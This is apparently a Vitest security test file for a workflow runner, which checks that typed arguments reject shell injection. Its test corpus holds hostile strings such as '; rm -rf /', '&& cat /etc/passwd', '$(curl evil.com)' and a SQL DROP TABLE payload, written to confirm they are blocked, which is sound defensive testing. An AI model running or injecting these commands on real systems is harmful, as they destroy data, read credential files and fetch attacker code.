/**
 * Security tests for typed workflow arguments (ANV-0039).
 *
 * Verifies that:
 *   1. WorkflowArgument schema validates typed argument declarations.
 *   2. WorkflowStep enforces spawn-style argv arrays (no shell string joining).
 *   3. resolveWorkflowArgs coerces and validates input values against a declared schema.
 *   4. Shell metacharacters in user input are rejected when shell-required is false.
 *   5. shell-required: true steps are visibly marked.
 *   6. Injection corpus: 12 malicious strings × 3 argument types are all caught.
 */
import { describe, expect, it } from 'vitest'
import {
  WorkflowArgument,
  WorkflowDefinition,
  WorkflowStep,
} from '../../src/core/types.js'
import { resolveWorkflowArgs } from '../../src/core/workflow/args.js'

// ── Injection corpus ────────────────────────────────────────────────────────
// 12 strings that would be dangerous if interpolated into a shell string.
const INJECTION_CORPUS: string[] = [
  '; rm -rf /',
  '&& cat /etc/passwd',
  '|| echo pwned',
  '$(curl evil.com)',
  '`id`',
  '\nrm -rf /',
  '$IFS',
  '${PATH}',
  "'; DROP TABLE users; --",
  '\x00malicious',
  '\r\nHTTP/1.1 200 OK',
  '$(echo${IFS}injection)',
]

// ── WorkflowArgument schema ─────────────────────────────────────────────────
describe('WorkflowArgument schema', () => {
  it('parses a minimal string argument', () => {
    const arg = WorkflowArgument.parse({
      name: 'target',
      type: 'string',
      description: 'Target file path',
    })
    expect(arg.name).toBe('target')
    expect(arg.type).toBe('string')
    expect(arg.required).toBe(false) // default
  })

  it('parses a required number argument', () => {
    const arg = WorkflowArgument.parse({
      name: 'count',
      type: 'number',
      description: 'How many items',
      required: true,
    })
    expect(arg.required).toBe(true)
    expect(arg.type).toBe('number')
  })

  it('parses a boolean argument', () => {
    const arg = WorkflowArgument.parse({
      name: 'verbose',
      type: 'boolean',
      description: 'Enable verbose output',
    })
    expect(arg.type).toBe('boolean')
  })

  it('rejects an unknown type', () => {
    expect(() =>
      WorkflowArgument.parse({
        name: 'x',
        type: 'object',
        description: 'nope',
      }),
    ).toThrow()
  })

  it('rejects missing name', () => {
    expect(() =>
      WorkflowArgument.parse({ type: 'string', description: 'x' }),
    ).toThrow()
  })

  it('rejects missing description', () => {
    expect(() =>
      WorkflowArgument.parse({ name: 'x', type: 'string' }),
    ).toThrow()
  })
})

// ── WorkflowStep schema ─────────────────────────────────────────────────────
describe('WorkflowStep schema', () => {
  it('parses a spawn-style step (argv array, no shell)', () => {
    const step = WorkflowStep.parse({
      name: 'compile',
      argv: ['tsc', '--noEmit'],
    })
    expect(step.argv).toEqual(['tsc', '--noEmit'])
    expect(step['shell-required']).toBe(false) // default
    expect(step.destructive).toBe(false) // default
  })

  it('parses a shell-required step with explicit flag', () => {
    const step = WorkflowStep.parse({
      name: 'pipe-step',
      argv: ['bash', '-c', 'cat foo | grep bar'],
      'shell-required': true,
    })
    expect(step['shell-required']).toBe(true)
  })

  it('parses a destructive step with approval metadata', () => {
    const step = WorkflowStep.parse({
      name: 'delete-build',
      argv: ['rm', '-rf', 'dist/'],
      destructive: true,
    })
    expect(step.destructive).toBe(true)
  })

  it('requires argv to be a non-empty array', () => {
    expect(() => WorkflowStep.parse({ name: 'empty', argv: [] })).toThrow()
  })

  it('requires a name', () => {
    expect(() => WorkflowStep.parse({ argv: ['echo', 'hi'] })).toThrow()
  })

  it('rejects argv that is a plain string (injection guard)', () => {
    expect(() =>
      WorkflowStep.parse({ name: 'bad', argv: 'echo hello && rm -rf /' }),
    ).toThrow()
  })
})

// ── WorkflowDefinition schema ───────────────────────────────────────────────
describe('WorkflowDefinition schema', () => {
  it('parses a complete workflow definition', () => {
    const wf = WorkflowDefinition.parse({
      name: 'build',
      arguments: [
        {
          name: 'target',
          type: 'string',
          description: 'Build target',
          required: true,
        },
      ],
      steps: [{ name: 'run-build', argv: ['npm', 'run', 'build'] }],
    })
    expect(wf.name).toBe('build')
    expect(wf.arguments).toHaveLength(1)
    expect(wf.steps).toHaveLength(1)
  })

  it('allows a workflow with no arguments (pure steps)', () => {
    const wf = WorkflowDefinition.parse({
      name: 'clean',
      steps: [
        { name: 'clean-dist', argv: ['rm', '-rf', 'dist/'], destructive: true },
      ],
    })
    expect(wf.arguments).toEqual([])
  })

  it('requires at least one step', () => {
    expect(() =>
      WorkflowDefinition.parse({ name: 'empty-wf', steps: [] }),
    ).toThrow()
  })
})

// ── resolveWorkflowArgs — safe coercion ────────────────────────────────────
describe('resolveWorkflowArgs — coercion and validation', () => {
  const schema: WorkflowArgument[] = [
    { name: 'path', type: 'string', description: 'File path', required: true },
    { name: 'count', type: 'number', description: 'Count', required: false },
    {
      name: 'verbose',
      type: 'boolean',
      description: 'Verbose',
      required: false,
    },
  ]

  it('accepts clean string input', () => {
    const result = resolveWorkflowArgs(schema, { path: 'src/index.ts' })
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.value.path).toBe('src/index.ts')
  })

  it('coerces numeric string to number for number-typed arg', () => {
    const result = resolveWorkflowArgs(schema, { path: 'foo', count: '42' })
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.value.count).toBe(42)
  })

  it('coerces "true"/"false" string to boolean for boolean-typed arg', () => {
    const t = resolveWorkflowArgs(schema, { path: 'foo', verbose: 'true' })
    expect(t.ok).toBe(true)
    if (t.ok) expect(t.value.verbose).toBe(true)

    const f = resolveWorkflowArgs(schema, { path: 'foo', verbose: 'false' })
    expect(f.ok).toBe(true)
    if (f.ok) expect(f.value.verbose).toBe(false)
  })

  it('rejects missing required argument', () => {
    const result = resolveWorkflowArgs(schema, {})
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toMatch(/required/)
  })

  it('rejects extra unknown arguments', () => {
    const result = resolveWorkflowArgs(schema, { path: 'foo', unknown: 'bar' })
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toMatch(/unknown argument/i)
  })

  it('rejects non-numeric value for number-typed arg', () => {
    const result = resolveWorkflowArgs(schema, {
      path: 'foo',
      count: 'not-a-number',
    })
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.error).toMatch(/count/)
  })
})

// ── Injection corpus — string type ─────────────────────────────────────────
describe('resolveWorkflowArgs — injection corpus (string type)', () => {
  const schema: WorkflowArgument[] = [
    {
      name: 'input',
      type: 'string',
      description: 'User input',
      required: true,
    },
  ]

  // For string-typed args with shell-required: false (the default), shell metacharacters
  // MUST be rejected at validation time — the value must never reach a shell string.
  for (const payload of INJECTION_CORPUS) {
    it(`rejects shell injection payload: ${JSON.stringify(payload)}`, () => {
      const result = resolveWorkflowArgs(schema, { input: payload })
      expect(result.ok).toBe(false)
      if (!result.ok)
        expect(result.error).toMatch(/shell metacharacter|injection/i)
    })
  }
})

// ── Injection corpus — number type ─────────────────────────────────────────
describe('resolveWorkflowArgs — injection corpus (number type)', () => {
  const schema: WorkflowArgument[] = [
    { name: 'count', type: 'number', description: 'Count', required: true },
  ]

  for (const payload of INJECTION_CORPUS) {
    it(`rejects injection via number arg: ${JSON.stringify(payload)}`, () => {
      const result = resolveWorkflowArgs(schema, { count: payload })
      expect(result.ok).toBe(false)
      // Either NaN/non-numeric error or metacharacter rejection
    })
  }
})

// ── Injection corpus — boolean type ────────────────────────────────────────
describe('resolveWorkflowArgs — injection corpus (boolean type)', () => {
  const schema: WorkflowArgument[] = [
    { name: 'flag', type: 'boolean', description: 'Flag', required: true },
  ]

  for (const payload of INJECTION_CORPUS) {
    it(`rejects injection via boolean arg: ${JSON.stringify(payload)}`, () => {
      const result = resolveWorkflowArgs(schema, { flag: payload })
      expect(result.ok).toBe(false)
      // Must not be 'true' or 'false' — injection strings are invalid
    })
  }
})

// ── shell-required escape hatch ─────────────────────────────────────────────
describe('resolveWorkflowArgs — shell-required escape hatch', () => {
  const schema: WorkflowArgument[] = [
    {
      name: 'filter',
      type: 'string',
      description: 'Grep pattern',
      required: true,
      'shell-required': true,
    },
  ]

  it('accepts shell metacharacters when arg is marked shell-required', () => {
    // shell-required args are passed through — the caller owns the escaping
    const result = resolveWorkflowArgs(schema, { filter: 'foo|bar' })
    expect(result.ok).toBe(true)
  })

  it('still returns the value unchanged for shell-required args', () => {
    const result = resolveWorkflowArgs(schema, { filter: 'grep -E "foo|bar"' })
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.value.filter).toBe('grep -E "foo|bar"')
  })
})
